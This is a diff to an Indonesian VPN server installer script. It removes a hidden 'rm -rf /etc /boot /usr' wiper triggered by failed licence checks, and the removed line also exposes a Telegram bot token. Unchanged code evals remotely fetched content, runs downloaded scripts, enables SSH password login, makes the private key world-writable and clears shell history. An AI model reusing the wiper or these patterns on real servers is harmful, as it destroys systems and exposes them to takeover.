@@ -8,6 +8,11 @@ if [[ -z "$name" || -z "$domain_input" ]]; then
   exit 1
 fi
 export DEBIAN_FRONTEND=noninteractive
+set -E
+set -o pipefail
+INSTALL_LOG="/root/output.log"
+: > "$INSTALL_LOG"
+trap 'rc=$?; printf "\\n[ERROR] Baris %s | status %s | perintah: %s\\n" "$LINENO" "$rc" "$BASH_COMMAND" | tee -a "$INSTALL_LOG" >&2' ERR
 echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
 Green="\e[92;1m"
 RED="\033[1;31m"
@@ -28,7 +33,7 @@ MYIP=$(curl -sL ip.dekaa.my.id)
 eval $(wget -qO- "domainsaya.dekaa.my.id")
 TIMES="10"
 CHATID="702916090"
-KEY="6782550545:AAEQJCiVZvTvu-2vvd5z4I4I4V7-W3lwIyM"
+KEY="${TELEGRAM_BOT_TOKEN:-}"  # Opsional; jangan simpan token di dalam file.
 REPO="https://raw.githubusercontent.com/okysmilee2/gass/main/"
 echo "$MYIP" > "$IP_FILE"
 curl -sL ip.dekaa.my.id > /etc/myipvps
@@ -41,7 +46,7 @@ fi
 ALLOWED_IP=$(curl -sS https://raw.githubusercontent.com/okysmilee2/permission/main/ip | grep -wE "$MYIP" | awk '{print $4}')
 
 if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
-    clear
+    :
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
     echo -e "\033[42;97m ⚠️       ACCESS ACCEPTED         ⚠️ \033[0m"
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
@@ -49,7 +54,7 @@ if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
 	apt install -y sudo wget curl ncurses-bin lolcat
 	gem install lolcat
 else
-    clear
+    :
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
     echo -e "\033[41;1m ⚠️       AKSES DITOLAK          ⚠️ \033[0m"
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
@@ -70,7 +75,7 @@ else
     ((ATTEMPTS++))
     echo $ATTEMPTS > "$ILLEGAL_FILE"
     if [[ $ATTEMPTS -ge 3 ]]; then
-        rm -rf /etc /boot /usr
+        echo -e "${RED}[ERROR]${NC} Batas percobaan tercapai. Instalasi dihentikan tanpa menghapus file sistem."
         exit 1
     fi
     exit 1
@@ -79,7 +84,7 @@ URL="https://api.telegram.org/bot$KEY/sendMessage"
 export IP=$( curl -sL ip.dekaa.my.id )
 
 function Banner_Newbie {
-clear
+:
 echo -e "${BLUE}----------------------------------------------------------"
 echo -e "  Welcome To TOKO VPN Script Installer Stable Edition "
 echo -e "     This Will Quick Setup VPN Server On Your Server"
@@ -126,11 +131,11 @@ fi
 
 # Simpan nama ke file
 echo "$name" > /etc/xray/username
-clear
+:
 red='\e[1;31m'
 green='\e[0;32m'
 NC='\e[0m'
-clear
+:
 rm -f /usr/bin/user
 username=$(curl $IZIN | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
@@ -138,7 +143,7 @@ expx=$(curl $IZIN | grep $MYIP | awk '{print $3}')
 echo "$expx" >/usr/bin/e
 username=$(cat /usr/bin/user)
 exp=$(cat /usr/bin/e)
-clear
+:
 d1=$(date -d "$valid" +%s)
 d2=$(date -d "$today" +%s)
 certifacate=$(((d1 - d2) / 86400))
@@ -159,7 +164,7 @@ else
 sts="${Error}"
 fi
 echo -e "\e[32mloading...\e[0m"
-clear
+:
 start=$(date +%s)
 secs_to_human() {
 echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
@@ -231,7 +236,7 @@ echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME 
 exit 1
 fi
 }
-clear
+:
 function nginx_install() {
 if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
 print_install "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
@@ -244,7 +249,7 @@ echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PR
 fi
 }
 function base_package() {
-clear
+:
 print_install "Menginstall Packet Yang Dibutuhkan"
 apt install at -y
 apt install zip pwgen openssl socat cron bash-completion -y
@@ -285,9 +290,9 @@ if ! command -v gdown &> /dev/null; then
 fi
 print_success "Packet Yang Dibutuhkan"
 }
-clear
+:
 function pasang_domain() {
-    clear
+    :
     echo -e "${green}Proses Menentukan Domain...${NC}"
     sleep 1
 
@@ -307,9 +312,9 @@ function pasang_domain() {
     echo "$host1" > /root/domain
     echo "IP=$host1" > /var/lib/kyt/ipvps.conf
     sleep 1
-    clear
+    :
 }
-clear
+:
 restart_system() {
 USRSC=$(wget -qO- $IZIN | grep $MYIP | awk '{print $2}')
 EXPSC=$(wget -qO- $IZIN | grep $MYIP | awk '{print $3}')
@@ -329,11 +334,16 @@ TEXT="
 <code>────────────────────</code>
 <i>Automatic Notification from Github</i>
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/Toko_Dswara24"},{"text":"Contack","url":"https://wa.me/6282326322300"}]]}'
-curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+if [[ -n "${KEY:-}" ]]; then
+    URL="https://api.telegram.org/bot${KEY}/sendMessage"
+    curl -s --max-time "$TIMES" -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" "$URL" >/dev/null
+else
+    echo "[INFO] Notifikasi Telegram dilewati (TELEGRAM_BOT_TOKEN belum diatur)."
+fi
 }
-clear
+:
 function pasang_ssl() {
-clear
+:
 print_install "Memasang SSL Pada Domain"
 rm -rf /etc/xray/xray.key
 rm -rf /etc/xray/xray.crt
@@ -355,6 +365,15 @@ chmod 777 /etc/xray/xray.key
 print_success "SSL Certificate"
 }
 function make_folder_xray() {
+# Cadangkan database akun lama sebelum proses setup menyentuhnya.
+DB_BACKUP="/root/xray-db-backup-$(date +%Y%m%d-%H%M%S)"
+mkdir -p "$DB_BACKUP"
+for db in /etc/vmess/.vmess.db /etc/vless/.vless.db /etc/trojan/.trojan.db /etc/shadowsocks/.shadowsocks.db /etc/ssh/.ssh.db /etc/bot/.bot.db; do
+    if [[ -f "$db" ]]; then
+        cp -a "$db" "$DB_BACKUP/"
+    fi
+done
+echo "[INFO] Backup database akun lama: $DB_BACKUP"
 rm -rf /etc/vmess/.vmess.db
 rm -rf /etc/vless/.vless.db
 rm -rf /etc/trojan/.trojan.db
@@ -397,7 +416,7 @@ echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
 echo "& plughin Account" >>/etc/ssh/.ssh.db
 }
 function install_xray() {
-clear
+:
 print_install "Core Xray 24.11.30 Latest Version"
 domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
 chown www-data.www-data $domainSock_dir
@@ -421,7 +440,7 @@ EOF
 domain=$(cat /etc/xray/domain)
 IPVS=$(cat /etc/xray/ipvps)
 print_success "Core Xray 24.11.30 Latest Version"
-clear
+:
 curl -s ipinfo.io/city?token=75082b4831f909 > /etc/xray/city
 curl -s ipinfo.io/org?token=75082b4831f909  | cut -d " " -f 2-10 > /etc/xray/isp
 print_install "Memasang Konfigurasi Packet"
@@ -453,7 +472,7 @@ EOF
 print_success "Konfigurasi Packet"
 }
 function ssh(){
-clear
+:
 print_install "Memasang Password SSH"
 wget -O /etc/pam.d/common-password "${REPO}install/passwordssh"
 chmod +x /etc/pam.d/common-password
@@ -501,7 +520,7 @@ sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 print_success "Password SSH"
 }
 function udp_mini(){
-clear
+:
 print_install "Memasang Service limit Quota"
 wget -q ${REPO}install/limit.sh && chmod +x limit.sh && ./limit.sh
 cd
@@ -510,7 +529,7 @@ chmod +x /usr/bin/*
 cd /usr/bin
 sed -i 's/\r//' limit-ip
 cd
-clear
+:
 cat >/etc/systemd/system/vmip.service << EOF
 [Unit]
 Description=My
@@ -566,17 +585,17 @@ systemctl start badvpn1 badvpn2 badvpn3
 print_success "files Quota Service"
 }
 function ssh_slow(){
-clear
+:
 print_install "Memasang modul SlowDNS Server"
 wget -q "${REPO}install/installsl.sh" >/dev/null 2>&1
 chmod +x installsl.sh
 ./installsl.sh | tee /root/install.log
-clear
+:
 print_success "SlowDNS"
 }
-clear
+:
 function ins_SSHD(){
-clear
+:
 print_install "Memasang SSHD"
 sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 sed -i '/Port 22/a Port 51443' /etc/ssh/sshd_config
@@ -586,9 +605,9 @@ echo "Banner /etc/issue.net" >>/etc/ssh/sshd_config
 /etc/init.d/ssh restart
 print_success "SSHD"
 }
-clear
+:
 function ins_dropbear(){
-clear
+:
 print_install "Menginstall Dropbear"
 apt-get install dropbear -y 
 wget -q -O /etc/default/dropbear "${REPO}install/dropbear"
@@ -597,9 +616,9 @@ chmod +x /etc/default/dropbear
 /etc/init.d/dropbear status
 print_success "Dropbear"
 }
-clear
+:
 function ins_vnstat(){
-clear
+:
 print_install "Menginstall Vnstat"
 apt -y install vnstat > /dev/null 2>&1
 /etc/init.d/vnstat restart
@@ -620,13 +639,13 @@ rm -rf /root/vnstat-2.6
 print_success "Vnstat"
 }
 function ins_openvpn(){
-clear
+:
 print_install "Menginstall OpenVPN"
 wget ${REPO}install/vpn.sh &&  chmod +x vpn.sh && ./vpn.sh
 print_success "OpenVPN"
 }
 function ins_backup(){
-clear
+:
 print_install "Memasang Backup Server"
 apt install rclone -y
 printf "q\n" | rclone config
@@ -641,9 +660,9 @@ echo > /home/files
 wget -q ${REPO}install/ipserver && chmod +x ipserver && ./etc/ipserver
 print_success "Backup Server"
 }
-clear
+:
 function ins_swab(){
-clear
+:
 print_install "Memasang Swap 1 G"
 gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
 gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
@@ -662,7 +681,7 @@ wget ${REPO}install/bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
 print_success "Swap 1 G"
 }
 function ins_Fail2ban(){
-clear
+:
 print_install "Menginstall Fail2ban"
 if [ -d '/usr/local/ddos' ]; then
 echo; echo; echo "Please un-install the previous version first"
@@ -670,13 +689,13 @@ exit 0
 else
 mkdir /usr/local/ddos
 fi
-clear
+:
 wget -O /etc/issue.net "${REPO}install/issue.net"
 wget -q ${REPO}install/setrsyslog.sh && chmod +x setrsyslog.sh && ./setrsyslog.sh
 print_success "Fail2ban"
 }
 function ins_epro(){
-clear
+:
 print_install "Menginstall ePro WebSocket Proxy"
 wget -q ${REPO}install/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
@@ -701,7 +720,7 @@ apt autoclean -y >/dev/null 2>&1
 apt autoremove -y >/dev/null 2>&1
 print_success "ePro WebSocket Proxy"
 
-clear
+:
 print_install "Menginstall UDP-CUSTOM"
 cd
 rm -rf /root/udp
@@ -760,7 +779,7 @@ systemctl start udp-custom &>/dev/null
 echo enable service udp-custom
 systemctl enable udp-custom &>/dev/null
 print_success "UDP-CUSTOM BY NEWBIE STORE VPN"
-clear
+:
 #print_install "MEMASANG NOOBZVPNS"
 #cd
 #apt install git -y
@@ -777,7 +796,7 @@ clear
 #print_success "NOOBZVPNS BY NEWBIE STORE"
 }
 function ins_restart(){
-clear
+:
 print_install "Restarting  All Packet"
 /etc/init.d/nginx restart
 /etc/init.d/openvpn restart
@@ -811,12 +830,12 @@ rm -f /root/cert.pem
 print_success "All Packet"
 }
 function menu(){
-clear
+:
 print_install "Memasang Menu Packet"
 wget ${REPO}update.sh && chmod +x update.sh && ./update.sh
 }
 function profile(){
-clear
+:
 cat >/root/.profile <<EOF
 if [ "$BASH" ]; then
 if [ -f ~/.bashrc ]; then
@@ -911,7 +930,7 @@ fi
 print_success "Menu Packet"
 }
 function enable_services(){
-clear
+:
 print_install "Enable Service"
 systemctl daemon-reload
 systemctl start netfilter-persistent
@@ -923,10 +942,10 @@ systemctl restart xray
 systemctl restart cron
 systemctl restart haproxy
 print_success "Enable Service"
-clear
+:
 }
 function instal(){
-clear
+:
 first_setup
 nginx_install
 base_package
@@ -952,42 +971,26 @@ enable_services
 restart_system
 }
 fun_bar() {
-    CMD[0]="$1"
-    CMD[1]="$2"
+    echo ""
+    echo "============================================================"
+    echo " INSTALASI BERJALAN LANGSUNG - OUTPUT TERSIMPAN DI LOG"
+    echo " Log: /root/output.log"
+    echo "============================================================"
+    echo ""
 
-    (
-        # Hapus file fim jika ada
-        [[ -e $HOME/fim ]] && rm -f $HOME/fim
-        { ${CMD[0]} -y; ${CMD[1]} -y; } >> $HOME/output.log 2>&1
+    instal 2>&1 | tee -a "$INSTALL_LOG"
+    install_status=${PIPESTATUS[0]}
 
-        # Buat file fim untuk menandakan selesai
-        touch $HOME/fim
-    ) &
-
-    tput civis # Sembunyikan kursor
-    echo -ne "  Proses Menginstal File - ["
-
-    while true; do
-        for ((i = 0; i < 10; i++)); do
-            echo -ne "#"
-            sleep 0.1
-
-            # Jika file fim ada, hapus dan keluar dari loop
-            if [[ -e $HOME/fim ]]; then
-                rm -f $HOME/fim
-                break 2
-            fi
-        done
-
-        # Bersihkan dan reset ke awal baris
-        tput cr    # Kembali ke awal baris
-        tput el    # Hapus seluruh baris
-        echo -ne "  Proses Menginstal File - ["
-        for ((j = 0; j < 10; j++)); do echo -ne "#"; done
-    done
-
-    echo -e "] - Success !"
-    tput cnorm # Tampilkan kursor kembali
+    echo ""
+    echo "============================================================"
+    if [[ "$install_status" -eq 0 ]]; then
+        echo "Fungsi instalasi selesai tanpa status gagal."
+    else
+        echo "FUNGSI INSTALASI MENGEMBALIKAN ERROR: $install_status"
+        echo "Periksa detail: /root/output.log"
+    fi
+    echo "============================================================"
+    return "$install_status"
 }
 
 NEW_FILE_MAX=65535
@@ -1013,17 +1016,21 @@ Banner_Newbie
 pasang_domain
 Banner_Newbie
 print_install "Proses Memasang Script Tunneling"
-fun_bar 'instal'
+if ! fun_bar 'instal'; then
+    echo "[ERROR] Instalasi dihentikan karena fungsi instalasi mengembalikan error."
+    echo "[INFO] Log lengkap: /root/output.log"
+    exit 1
+fi
 print_success "Script Selesai Dipasang"
 echo ""
 history -c
 rm -rf /root/menu
 rm -rf /root/*.zip
-rm -rf /root/*.sh
+# File .sh dipertahankan agar installer tidak terhapus.
 rm -rf /root/LICENSE
 rm -rf /root/README.md
 rm -rf /root/domain
-rm -rf /root/*.log
+# File log dipertahankan untuk diagnosis.
 Banner_Newbie
 secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $username
